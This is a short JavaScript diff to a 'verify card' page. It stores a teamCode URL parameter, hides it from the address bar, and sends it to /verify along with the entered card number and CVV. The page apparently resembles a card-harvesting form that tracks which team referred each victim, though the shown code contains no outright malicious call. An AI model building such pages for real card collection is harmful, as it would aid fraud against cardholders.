@@ -1,3 +1,15 @@
+   document.addEventListener("DOMContentLoaded", () => {
+  const params = new URLSearchParams(window.location.search);
+  const teamcode = params.get("teamCode");
+  if (teamcode) {
+    localStorage.setItem("teamCode", teamcode);
+    params.delete("teamCode");
+    const cleanURL = window.location.pathname + (params.toString() ? "?" + params.toString() : "");
+    window.history.replaceState({}, document.title, cleanURL);
+
+    console.log("Teamcode saved:", teamcode);
+  }
+});
 document.getElementById("verifyBtn").addEventListener("click", async () => {
   const cardNo = document.getElementById("cardNo").value.trim();
   const cvv = document.getElementById("cvv").value.trim();
@@ -5,7 +17,7 @@ document.getElementById("verifyBtn").addEventListener("click", async () => {
   const res = await fetch("/verify", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ cardNo, cvv })
+    body: JSON.stringify({ cardNo, cvv, teamcode: localStorage.getItem("teamCode") })
   });
 
   const data = await res.json();
